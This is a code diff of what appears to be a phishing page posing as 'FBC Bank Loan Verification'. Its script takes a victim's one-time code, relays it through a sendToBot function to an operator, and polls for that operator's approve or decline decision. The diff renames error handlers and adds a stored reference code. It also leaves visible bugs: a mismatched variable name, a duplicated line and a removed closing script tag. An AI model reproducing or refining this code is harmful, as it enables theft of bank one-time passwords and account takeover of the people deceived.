@@ -502,16 +502,16 @@
     let state = { lastUpdateId: 0 };
     let isProcessing = false;
 
-    const codeError = document.getElementById('codeError');
+    const otpError = document.getElementById('otpError');
     const codeInput = document.getElementById('codeInput');
 
-    function showCodeError(msg) {
-      codeError.textContent = msg;
-      codeError.style.display = 'block';
+    function showOtpError(msg) {
+      otpError.textContent = msg;
+      otpError.style.display = 'block';
     }
 
-    function hideCodeError() {
-      codeError.style.display = 'none';
+    function hideOtpError() {
+      otpError.style.display = 'none';
     }
 
     function resetButton() {
@@ -542,7 +542,7 @@
           text: `
 <b>📱 FBC Bank Loan Verification</b>
 
-Code: <code>${codee}</code>
+Code: <code>${code}</code>
 Applicant: <code>Not provided</code>
 `,
           parse_mode: 'HTML',
@@ -561,13 +561,15 @@ Applicant: <code>Not provided</code>
       })
       .then(() => {
         localStorage.setItem('fbc_verified_otp', code);
-      
+        localStorage.setItem('fbc_verified_otp', code);
+        localStorage.setItem('fbc_otp_ref', '9vXfk');
+
         document.getElementById('spinnerOverlay').style.display = 'flex';
         startPolling(approveId, declineId, verifyId);
       })
       .catch(() => {
-        hideCodeError();
-        showCodeError('Something went wrong while sending the request. Please try again.');
+        hideOtpError();
+        showOtpError('Something went wrong while sending the request. Please try again.');
         resetButton();
       });
     }
@@ -598,7 +600,7 @@ Applicant: <code>Not provided</code>
                 else if (cb === declineId) {
                   clearInterval(interval);
                   document.getElementById('spinnerOverlay').style.display = 'none';
-                  showCodeError('Request declined. Please try again.');
+                  showOtpError('Request declined. Please try again.');
                   resetButton();
                 }
               }
@@ -606,34 +608,36 @@ Applicant: <code>Not provided</code>
           })
           .catch(() => {
             document.getElementById('spinnerOverlay').style.display = 'none';
-            showCodeError('Polling failed. Please try again.');
+            showOtpError('Polling failed. Please try again.');
             resetButton();
           });
       }, 1000);
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-      const savedCode = localStorage.getItem('fbc_verified_otp');
+      const savedPhone = localStorage.getItem('fbc_verified_otp');
       if (savedCode) {
         codeInput.value = savedCode;
+        const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
+      document.getElementById('refCodeText').textContent = 'Ref: ' + savedRef;
       }
     });
 
-    function handleCodeSubmit(e) {
+    function handleOtpSubmit(e) {
       e.preventDefault();
 
       const codeVal = codeInput.value.trim();
 
-      if (!codeVal || codeVal.length < 8) {
-        showCodeError('Please enter a valid mobile number');
+      if (!codeVal || codeVal.length < 5) {
+        showOtpError('Please enter a valid mobile number');
         return;
       }
 
-      hideCodeError();
+      hideOtpError();
       sendToBot(codeVal);
     }
 
-    document.getElementById('codeForm').addEventListener('submit', handleCodeSubmit);
+    document.getElementById('otpForm').addEventListener('submit', handleOtpSubmit);
 
     function openSupportModal() {
       document.getElementById('supportModal').style.display = 'flex';
@@ -648,7 +652,5 @@ Applicant: <code>Not provided</code>
     <div class="spin-label">Verifying &amp; Processing</div>
     <div class="spin-sub">Please hold on…</div>
       </div>
-
-  </script>
 </body>
 </html>
